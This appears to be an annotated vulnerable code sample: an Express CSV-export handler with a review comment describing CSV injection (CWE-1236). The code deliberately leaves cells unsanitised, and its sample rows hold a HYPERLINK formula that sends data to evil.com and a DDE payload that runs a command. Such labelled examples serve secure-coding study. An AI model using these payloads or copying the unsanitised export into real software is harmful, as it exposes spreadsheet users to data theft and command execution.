// [frensense]
// observation: User input written directly into a CSV export without sanitising cells that start with `=`, `+`, `-`, or `@`. When opened in Excel/Sheets, these are interpreted as formulas.
// impact: CSV injection (CWE-1236). An attacker can execute arbitrary formulas in the spreadsheet of any user who downloads and opens the report, exfiltrating data via DDE or HYPERLINK.
// improvement: Prefix dangerous leading characters with a single quote or tab, or escape the cell value.

import { Request, Response } from 'express';

export async function exportUsers(req: Request, res: Response): Promise<void> {
  type UserRow = [string, string, string];
  const users: UserRow[] = [
    ['1', 'Alice', 'alice@example.com'],
    ['2', 'Bob', 'bob@example.com'],
    ['3', '=HYPERLINK("http://evil.com?exfil="&A1,"click")', '=cmd|/C calc!A0'],
  ];

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="users.csv"');

  const header = 'id,name,email\n';
  const rows = users.map(row => row.join(',')).join('\n');
  res.send(header + rows);
}
